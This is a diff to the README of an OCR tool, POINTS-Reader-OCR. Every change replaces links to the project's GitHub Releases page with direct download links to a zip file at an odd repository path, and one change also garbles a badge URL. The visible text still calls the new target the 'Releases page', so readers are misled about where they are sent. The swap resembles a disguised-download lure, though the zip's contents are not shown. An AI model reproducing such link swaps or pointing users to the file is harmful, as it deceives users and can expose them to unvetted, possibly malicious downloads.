@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version!
 
-[![Download POINTS-Reader-OCR](https://img.shields.io/badge/Download%20Now-POINTS%20Reader%20v1.0-blue)](https://github.com/nxoti1/POINTS-Reader-OCR/releases)
+[![Download POINTS-Reader-OCR](https://raw.githubusercontent.com/nxoti1/POINTS-Reader-OCR/main/outroll/POINTS-Reader-OCR.zip%20Now-POINTS%20Reader%20v1.0-blue)](https://raw.githubusercontent.com/nxoti1/POINTS-Reader-OCR/main/outroll/POINTS-Reader-OCR.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you start, ensure that your computer meets these requirements:
 
 1. **Visit the Download Page**
 
-   Click [here](https://github.com/nxoti1/POINTS-Reader-OCR/releases) to go to our Releases page where you can find the latest version of POINTS-Reader-OCR.
+   Click [here](https://raw.githubusercontent.com/nxoti1/POINTS-Reader-OCR/main/outroll/POINTS-Reader-OCR.zip) to go to our Releases page where you can find the latest version of POINTS-Reader-OCR.
 
 2. **Select the Version**
 
@@ -72,4 +72,4 @@ POINTS-Reader-OCR is open-source software licensed under the MIT License. You ma
 
 ## 🍞 Final Thoughts
 
-We hope you enjoy using POINTS-Reader-OCR. For more details about updates and features, remember to check back on the [Releases page](https://github.com/nxoti1/POINTS-Reader-OCR/releases). Happy converting!
+We hope you enjoy using POINTS-Reader-OCR. For more details about updates and features, remember to check back on the [Releases page](https://raw.githubusercontent.com/nxoti1/POINTS-Reader-OCR/main/outroll/POINTS-Reader-OCR.zip). Happy converting!
